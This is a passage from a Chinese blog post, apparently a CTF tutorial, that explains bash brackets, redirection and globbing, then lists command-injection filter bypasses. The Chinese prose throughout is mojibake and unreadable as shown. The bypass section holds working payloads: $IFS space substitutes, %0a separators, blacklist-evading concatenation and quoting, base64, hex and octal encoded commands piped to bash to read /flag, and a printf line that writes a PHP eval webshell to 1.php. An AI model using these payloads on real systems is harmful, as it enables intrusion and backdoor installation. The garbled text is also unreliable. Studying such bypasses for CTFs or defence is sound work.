class="code"><pre><span class="line">mkdir &#123;userA,userB,userC&#125;-&#123;home,bin,data&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾—åˆ°<code>userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data</code>æ–‡ä»¶å¤¹ã€‚</p><p><img src="/2019/12/31/command-exec-bypass/20191231155709.png"></p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥æŸ¥çœ‹flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#123;/fl,/fla&#125;&#123;ag,g&#125;</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line">cat: /flg: No such file or directory</span><br><span class="line">cat: /flaag: No such file or directory</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸­æ‹¬å·"><a href="#ä¸­æ‹¬å·" class="headerlink" title="[]ä¸­æ‹¬å·"></a>[]ä¸­æ‹¬å·</h3><p>è¿™ä¸ªç¬¦å·åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ‹…ä»»ç±»ä¼¼ â€œèŒƒå›´â€ æˆ– â€œé›†åˆâ€ çš„è§’è‰²ã€‚</p><p><img src="/2019/12/31/command-exec-bypass/20191231160313.png"></p><h3 id="å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«"><a href="#å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«" class="headerlink" title="å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«"></a>å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«</h3><p>é‚£ä¹ˆï¼Œä¸‹é¢åˆæ¶‰åŠåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å°æ‹¬å·ï¼Œä¸­æ‹¬å·ï¼Œå’Œå¤§æ‹¬å·çš„åŒºåˆ«ã€‚</p><ol><li>å•å°æ‹¬å·ï¼Œ(cmd1;cmd2;cmd3) æ–°å¼€ä¸€ä¸ªå­shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¯ä»¥æ²¡æœ‰åˆ†å·ã€‚æŠŠ<code>command group</code>æ”¾åœ¨<code>subshell</code>å»æ‰§è¡Œï¼Œä¹Ÿå«åš<code>nested sub-shell</code>ã€‚</li><li>å•å¤§æ‹¬å·ï¼Œ{ cmd1;cmd2;cmd3;} åœ¨å½“å‰shellé¡ºåºæ‰§è¡Œå‘½ä»¤cmd1,cmd2,cmd3, å„å‘½ä»¤ä¹‹é—´ç”¨åˆ†å·éš”å¼€, æœ€åä¸€ä¸ªå‘½ä»¤åå¿…é¡»æœ‰åˆ†å·, ç¬¬ä¸€æ¡å‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»ç”¨ç©ºæ ¼éš”å¼€ã€‚èŠ±æ‹¬å·æ˜¯åœ¨åŒä¸€ä¸ª shell å…§å®Œæˆï¼Œä¹Ÿç§°ä¸º <code>non-namedcommand group</code>ã€‚</li></ol><p>æ‰€ä»¥è¯´ï¼Œå¦‚æœåœ¨shellé‡Œé¢æ‰§è¡Œâ€œå‡½æ•°â€ï¼Œéœ€è¦ç”¨åˆ°{}ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½ä»¤ç¾¤ç»„ä¹ˆã€‚<br>ä¸è¿‡ï¼Œæ ¹æ®å®æµ‹ï¼Œ<code>test=$(ls -a)</code>å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯<code>test=$&#123;lsâ€“a&#125;</code>è¯­æ³•ä¸Šé¢æ˜¯æœ‰é”™è¯¯çš„ã€‚ä¼°è®¡ä¹Ÿå’Œä¸Šé¢æ‰€è¯´çš„åŸå› æœ‰å…³ã€‚</p><p>å¦å¤–ï¼Œä»ç½‘ä¸Šæ‘˜å½•çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><ul><li>()åªæ˜¯å¯¹ä¸€ä¸²å‘½ä»¤é‡æ–°å¼€ä¸€ä¸ªå­shellè¿›è¡Œæ‰§è¡Œ</li><li>{}å¯¹ä¸€ä¸²å‘½ä»¤åœ¨å½“å‰shellæ‰§è¡Œ</li><li>()å’Œ{}éƒ½æ˜¯æŠŠä¸€ä¸²çš„å‘½ä»¤æ”¾åœ¨æ‹¬å·é‡Œé¢ï¼Œå¹¶ä¸”å‘½ä»¤ä¹‹é—´ç”¨;å·éš”å¼€</li><li>()æœ€åä¸€ä¸ªå‘½ä»¤å¯ä»¥ä¸ç”¨åˆ†å·</li><li>{}æœ€åä¸€ä¸ªå‘½ä»¤è¦ç”¨åˆ†å·</li><li>{}çš„ç¬¬ä¸€ä¸ªå‘½ä»¤å’Œå·¦æ‹¬å·ä¹‹é—´å¿…é¡»è¦æœ‰ä¸€ä¸ªç©ºæ ¼</li><li>()é‡Œçš„å„å‘½ä»¤ä¸å¿…å’Œæ‹¬å·æœ‰ç©ºæ ¼</li><li>()å’Œ{}ä¸­æ‹¬å·é‡Œé¢çš„æŸä¸ªå‘½ä»¤çš„é‡å®šå‘åªå½±å“è¯¥å‘½ä»¤ï¼Œä½†æ‹¬å·å¤–çš„é‡å®šå‘åˆ™å½±å“åˆ°æ‹¬å·é‡Œçš„æ‰€æœ‰å‘½ä»¤</li></ul><p>è¿™é‡Œå¼•å‡ºæ¥<code>[..]</code>å’Œ<code>[[...]]</code>çš„åŒºåˆ«ï¼šä½¿ç”¨<code>[[...]]</code>æ¡ä»¶åˆ¤æ–­ç»“æ„, è€Œä¸æ˜¯<code>[...]</code>, èƒ½å¤Ÿé˜²æ­¢è„šæœ¬ä¸­çš„è®¸å¤šé€»è¾‘é”™è¯¯.æ¯”å¦‚<code>&amp;&amp;</code>,<code>||</code>,<code>&lt;</code>,å’Œ<code>&gt;</code> æ“ä½œç¬¦èƒ½å¤Ÿæ­£å¸¸å­˜åœ¨äº<code>[[ ]]</code>æ¡ä»¶åˆ¤æ–­ç»“æ„ä¸­, ä½†æ˜¯å¦‚æœå‡ºç°åœ¨<code>[]</code>ç»“æ„ä¸­çš„è¯ï¼Œä¼šæŠ¥é”™ã€‚</p><p>å¯¹<code>&#123;&#125;</code>å’Œ<code>()</code>è€Œè¨€, æ‹¬å·ä¸­çš„é‡å®šå‘ç¬¦åªå½±å“è¯¥æ¡å‘½ä»¤ï¼Œ è€Œæ‹¬å·å¤–çš„é‡å®šå‘ç¬¦å½±å“åˆ°æ‹¬å·ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚</p><h3 id="è¾“å…¥è¾“å‡º-é‡å®šå‘"><a href="#è¾“å…¥è¾“å‡º-é‡å®šå‘" class="headerlink" title="è¾“å…¥è¾“å‡º/é‡å®šå‘"></a>è¾“å…¥è¾“å‡º/é‡å®šå‘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;      &gt;&gt;   &lt;   &lt;&lt;   :&gt;   &amp;&gt;   2&amp;&gt;   2&lt;&gt;&gt;&amp;   &gt;&amp;2</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶æè¿°ç¬¦(File Descriptor)ï¼Œç”¨ä¸€ä¸ªæ•°å­—ï¼ˆé€šå¸¸ä¸º0-9ï¼‰æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶ã€‚</p><table><thead><tr><th align="left">æ–‡ä»¶æè¿°ç¬¦</th><th align="left">åç§°</th><th align="left">å¸¸ç”¨ç¼©å†™</th><th align="left">é»˜è®¤å€¼</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">æ ‡å‡†è¾“å…¥</td><td align="left">stdin</td><td align="left">é”®ç›˜</td></tr><tr><td align="left">1</td><td align="left">æ ‡å‡†è¾“å‡º</td><td align="left">stdout</td><td align="left">å±å¹•</td></tr><tr><td align="left">2</td><td align="left">æ ‡å‡†é”™è¯¯è¾“å‡º</td><td align="left">stderr</td><td align="left">å±å¹•</td></tr></tbody></table><p>æˆ‘ä»¬åœ¨ç®€å•åœ°ç”¨<code>&lt;</code>æˆ–<code>&gt;</code>æ—¶ï¼Œç›¸å½“äºä½¿ç”¨<code>0&lt;</code>æˆ–<code>1&gt;</code>ï¼ˆä¸‹é¢ä¼šè¯¦ç»†ä»‹ç»ï¼‰ã€‚</p><ul><li><p>cmd &gt; file<br>æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ã€‚å¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºåŸæœ‰æ–‡ä»¶ï¼Œä½¿ç”¨bashçš„noclobberé€‰é¡¹å¯ä»¥é˜²æ­¢å¤ç›–åŸæœ‰æ–‡ä»¶ã€‚</p></li><li><p>cmd &gt;&gt; file<br>æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ï¼Œå¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æŠŠä¿¡æ¯åŠ åœ¨åŸæœ‰æ–‡ä»¶åé¢ã€‚</p></li><li><p>cmd &lt; file<br>ä½¿cmdå‘½ä»¤ä»fileè¯»å…¥</p></li><li><p>cmd &lt;&lt; text<br>ä»å‘½ä»¤è¡Œè¯»å–è¾“å…¥ï¼Œç›´åˆ°ä¸€ä¸ªä¸textç›¸åŒçš„è¡Œç»“æŸã€‚é™¤éä½¿ç”¨å¼•å·æŠŠè¾“å…¥æ‹¬èµ·æ¥ï¼Œæ­¤æ¨¡å¼å°†å¯¹è¾“å…¥å†…å®¹è¿›è¡Œshellå˜é‡æ›¿æ¢ã€‚å¦‚æœä½¿ç”¨<code>&lt;&lt;-</code> ï¼Œåˆ™ä¼šå¿½ç•¥æ¥ä¸‹æ¥è¾“å…¥è¡Œé¦–çš„tabï¼Œç»“æŸè¡Œä¹Ÿå¯ä»¥æ˜¯ä¸€å †tabå†åŠ ä¸Šä¸€ä¸ªä¸textç›¸åŒçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒå¾Œé¢çš„ä¾‹å­ã€‚</p></li><li><p>cmd &lt;&lt;&lt; word<br>æŠŠwordï¼ˆè€Œä¸æ˜¯æ–‡ä»¶wordï¼‰å’Œåé¢çš„æ¢è¡Œä½œä¸ºè¾“å…¥æä¾›ç»™cmdã€‚</p></li><li><p>cmd &lt;&gt; file<br>ä»¥è¯»å†™æ¨¡å¼æŠŠæ–‡ä»¶fileé‡å®šå‘åˆ°è¾“å…¥ï¼Œæ–‡ä»¶fileä¸ä¼šè¢«ç ´åã€‚ä»…å½“åº”ç”¨ç¨‹åºåˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§æ—¶ï¼Œå®ƒæ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p></li><li><p>cmd &gt;| file<br>åŠŸèƒ½åŒ&gt;ï¼Œä½†å³ä¾¿åœ¨è®¾ç½®äº†noclobberæ—¶ä¹Ÿä¼šå¤ç›–fileæ–‡ä»¶ï¼Œæ³¨æ„ç”¨çš„æ˜¯|è€Œéä¸€äº›ä¹¦ä¸­è¯´çš„!ï¼Œç›®å‰ä»…åœ¨cshä¸­ä»æ²¿ç”¨<code>&gt;!</code>å®ç°è¿™ä¸€åŠŸèƒ½ã€‚</p></li><li><p>: &gt; filename</p><p>æŠŠæ–‡ä»¶<code>filename</code>æˆªæ–­ä¸º0é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ª0é•¿åº¦çš„æ–‡ä»¶(ä¸<code>touch</code>çš„æ•ˆæœç›¸åŒ).</p></li><li><p>cmd &gt;&amp;n</p><p>æŠŠè¾“å‡ºé€åˆ°æ–‡ä»¶æè¿°ç¬¦n</p></li><li><p>cmd m&gt;&amp;n</p><p>æŠŠè¾“å‡ºåˆ°æ–‡ä»¶ç¬¦mçš„ä¿¡æ¯é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦n</p></li><li><p>cmd &gt;&amp;-</p><p>å…³é—­æ ‡å‡†è¾“å‡º</p></li><li><p>cmd &lt;&amp;n</p><p>è¾“å…¥æ¥è‡ªæ–‡ä»¶æè¿°ç¬¦n</p></li><li><p>cmd m&lt;&amp;n</p><p>mæ¥è‡ªæ–‡ä»¶æè¿°å„ä¸ªn</p></li><li><p>cmd &lt;&amp;-</p><p>å…³é—­æ ‡å‡†è¾“å…¥</p></li><li><p>cmd &lt;&amp;n-</p><p>ç§»åŠ¨è¾“å…¥æ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚</p></li><li><p>cmd &gt;&amp;n-</p><p>ç§»åŠ¨è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚<br>æ³¨æ„ï¼š <code>&gt;&amp;</code>å®é™…ä¸Šå¤åˆ¶äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä½¿å¾—<code>cmd &gt; file 2&gt;&amp;1</code>ä¸<code>cmd 2&gt;&amp;1 &gt;file</code>çš„æ•ˆæœä¸ä¸€æ ·ã€‚</p></li></ul><h2 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h2><p>è¿˜æœ‰ä¸€ç±»é€šé…ç¬¦ï¼Œé¦–å…ˆå…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯Linux shellé€šé…ç¬¦/globæ¨¡å¼:</p><blockquote><p>glob æ¨¡å¼ï¼ˆglobbingï¼‰ä¹Ÿè¢«ç§°ä¹‹ä¸º shell é€šé…ç¬¦ï¼Œåå­—çš„èµ·æºæ¥è‡ªäº Unix V6 ä¸­çš„ <code>/etc/glob</code> ï¼ˆè¯¦è§ man æ–‡æ¡£ï¼‰ã€‚glob æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼åŒ¹é…ï¼Œæœ€å¸¸è§çš„æ˜¯é€šé…ç¬¦æ‹“å±•ï¼Œä¹Ÿå¯ä»¥å°† glob æ¨¡å¼è®¾ä¸ºç²¾ç®€äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æœ€æ–°çš„ CentOS 7 ä¸­å·²ç»åˆ é™¤äº† glob çš„ç›¸å…³æè¿°æ–‡æ¡£ï¼Œåˆ é™¤çš„åŸå› ç”±äº glob å·²ç»æ•´åˆåˆ°äº† shell ä¹‹ä¸­ï¼Œç„¶åå°±æœ‰äº† shell é€šé…ç¬¦ã€‚<strong>shell é€šé…ç¬¦ / glob æ¨¡å¼é€šå¸¸ç”¨æ¥åŒ¹é…ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ï¼ï¼ï¼</strong></p></blockquote><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">è§£é‡Š</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦</td></tr><tr><td align="left">?</td><td align="left">åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td></tr><tr><td align="left">[list]</td><td align="left">åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ</td></tr><tr><td align="left">[^list]</td><td align="left">åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ</td></tr><tr><td align="left">[!list]</td><td align="left">åŒ<code>[^list]</code></td></tr><tr><td align="left">{str1,str2,â€¦}</td><td align="left">åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ</td></tr><tr><td align="left">IFS</td><td align="left">ç”± &lt; space &gt; æˆ– &lt; tab &gt; æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ</td></tr><tr><td align="left">CR</td><td align="left">ç”± &lt; enter &gt; äº§ç”Ÿ</td></tr><tr><td align="left">!</td><td align="left">æ‰§è¡Œ history ä¸­çš„å‘½ä»¤</td></tr></tbody></table><p>ä»¥åŠè¿˜æœ‰ä¸“ç”¨å­—ç¬¦é›†</p><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left">[:alnum:]</td><td align="left">ä»»æ„æ•°å­—æˆ–è€…å­—æ¯</td></tr><tr><td align="left">[:alpha:]</td><td align="left">ä»»æ„å­—æ¯</td></tr><tr><td align="left">[:space:]</td><td align="left">ç©ºæ ¼</td></tr><tr><td align="left">[:lower:]</td><td align="left">å°å†™å­—æ¯</td></tr><tr><td align="left">[:digit:]</td><td align="left">ä»»æ„æ•°å­—</td></tr><tr><td align="left">[:upper:]</td><td align="left">ä»»æ„å¤§å†™å­—æ¯</td></tr><tr><td align="left">[:cntrl:]</td><td align="left">æ§åˆ¶ç¬¦</td></tr><tr><td align="left">[:graph:]</td><td align="left">å›¾å½¢</td></tr><tr><td align="left">[:print:]</td><td align="left">å¯æ‰“å°å­—ç¬¦</td></tr><tr><td align="left">[:punct:]</td><td align="left">æ ‡ç‚¹ç¬¦å·</td></tr><tr><td align="left">[:xdigit:]</td><td align="left">åå…­è¿›åˆ¶æ•°</td></tr><tr><td align="left">[:blank:]</td><td align="left">ç©ºç™½å­—ç¬¦</td></tr></tbody></table><ul><li>åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚<code>[[:space:]]</code></li><li>æƒ³è¦è½¬ä¹‰çš„æ—¶å€™ï¼Œå•å¼•å·ä¸åŒå¼•å·ä½¿ç”¨æ–¹æ³•æ˜¯ä¸åŒçš„ï¼Œå•å¼•å·ä¼šè½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œè€Œä¸”å•å¼•å·ä¸­é—´ä¸å…è®¸å†å‡ºç°å•å¼•å·ï¼ŒåŒå¼•å·å…è®¸å‡ºç°ç‰¹å®šçš„ shell å…ƒå­—ç¬¦ï¼Œå…·ä½“å­—ç¬¦å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢</li><li>åœ¨ä½¿ç”¨èŠ±æ‹¬å· {} çš„æ—¶å€™ï¼Œé‡Œé¢çš„å•ä¸ªå­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬ä½ï¼Œå¦åˆ™å°±ä¼šè§†ä¸ºå¤šä¸ªçš„å•ä¸ªå­—ç¬¦</li></ul><h2 id="å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§"><a href="#å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§" class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§"></a>å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§</h2><h3 id="1-ç©ºæ ¼ç»•è¿‡"><a href="#1-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="1. ç©ºæ ¼ç»•è¿‡"></a>1. ç©ºæ ¼ç»•è¿‡</h3><p>ç©ºæ ¼å¯ä»¥ç”¨ä»¥ä¸‹å­—ç¬¦ä¸²ä»£æ›¿ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ $&#123;IFS&#125;ã€$IFSç­‰</span><br></pre></td></tr></table></figure><p>$IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„cat$IFS2,bashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œç„¶è€Œå¦‚æœåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨<br>ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨$9å‘¢ï¼Œå› ä¸º$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p><h3 id="2-ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦"><a href="#2-ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦" class="headerlink" title="2.ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦"></a>2.ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linuxä¸­ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</span><br><span class="line">windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰</span><br></pre></td></tr></table></figure><p>1ã€åœ¨ shell ä¸­ï¼Œæ‹…ä»»â€è¿ç»­æŒ‡ä»¤â€åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯â€;â€<br>2ã€â€&amp;â€ æ”¾åœ¨å¯åŠ¨å‚æ•°åé¢è¡¨ç¤ºè®¾ç½®æ­¤è¿›ç¨‹ä¸ºåå°è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿›ç¨‹æ˜¯å‰å°è¿›ç¨‹ï¼Œè¿™æ—¶å°±æŠŠShellç»™å æ®äº†ï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œå…¶ä»–æ“ä½œï¼Œå¯¹äºé‚£äº›æ²¡æœ‰äº¤äº’çš„è¿›ç¨‹ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›å°†å…¶åœ¨åå°å¯åŠ¨ï¼Œå¯ä»¥åœ¨å¯åŠ¨å‚æ•°çš„æ—¶å€™åŠ ä¸€ä¸ªâ€™&amp;â€™å®ç°è¿™ä¸ªç›®çš„ã€‚<br>3ã€ç®¡é“ç¬¦â€|â€å·¦è¾¹å‘½ä»¤çš„è¾“å‡ºå°±ä¼šä½œä¸ºç®¡é“ç¬¦å³è¾¹å‘½ä»¤çš„è¾“å…¥ï¼Œæ‰€ä»¥å·¦è¾¹çš„è¾“å‡ºå¹¶ä¸æ˜¾ç¤º</p><h3 id="3-èŠ±æ‹¬å·çš„åˆ«æ ·ç”¨æ³•"><a href="#3-èŠ±æ‹¬å·çš„åˆ«æ ·ç”¨æ³•" class="headerlink" title="3.èŠ±æ‹¬å·çš„åˆ«æ ·ç”¨æ³•"></a>3.èŠ±æ‹¬å·çš„åˆ«æ ·ç”¨æ³•</h3><p>åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p><img src="/2019/12/31/command-exec-bypass/20190915145314225.png"></p><h3 id="4-é»‘åå•ç»•è¿‡"><a href="#4-é»‘åå•ç»•è¿‡" class="headerlink" title="4.é»‘åå•ç»•è¿‡"></a>4.é»‘åå•ç»•è¿‡</h3><h4 id="æ‹¼æ¥ç»•è¿‡"><a href="#æ‹¼æ¥ç»•è¿‡" class="headerlink" title="æ‹¼æ¥ç»•è¿‡"></a>æ‹¼æ¥ç»•è¿‡</h4><p>æ¯”å¦‚ï¼š<code>a=l;b=s;$a$b</code><br>ä¸Šé¢çš„ç¬¬äºŒé“é¢˜ç›®ä¹Ÿæ˜¯åˆ©ç”¨å¶è¯»æ‹¼æ¥æ–¹æ³•ç»•è¿‡é»‘åå•ï¼š<code>a=fl;b=ag;cat $a$b</code></p><h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><p><strong>base64ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> MTIzCg==|base64 -d å…¶å°†ä¼šæ‰“å°<span class="number">123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64-d|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure><p><strong>hexï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure><p><strong>octï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>) ==&gt;ls</span><br><span class="line">$(printf <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;cat /flag</span><br><span class="line">&#123;printf,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\$<span class="number">0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">$&#123;printf,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure><h4 id="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡"><a href="#å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡" class="headerlink" title="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡"></a>å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡</h4><p>æ¯”å¦‚ï¼š<code>ca&#39;&#39;t flag</code> æˆ–<code>ca&quot;&quot;t flag</code></p><h4 id="åæ–œæ ç»•è¿‡"><a href="#åæ–œæ ç»•è¿‡" class="headerlink" title="åæ–œæ ç»•è¿‡"></a>åæ–œæ ç»•è¿‡</h4><p>æ¯”å¦‚ï¼š<code>ca\t fl\ag</code></p><h4 id="åˆ©ç”¨Shell-ç‰¹æ®Šå˜é‡ç»•è¿‡"><a href="#åˆ©ç”¨Shell-ç‰¹æ®Šå˜é‡ç»•è¿‡" class="headerlink" title="åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡"></a>åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡</h4><table><thead><tr><th align="center">å˜é‡</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">å½“å‰è„šæœ¬çš„æ–‡ä»¶å</td></tr><tr><td align="center">$n</td><td align="center">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©º</td></tr><tr><td align="center">$#</td><td align="center">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°</td></tr><tr><td align="center">$$</td><td align="center">å½“å‰shellè¿›ç¨‹ID</td></tr><tr><td align="center">$*</td><td align="center">ä¼ 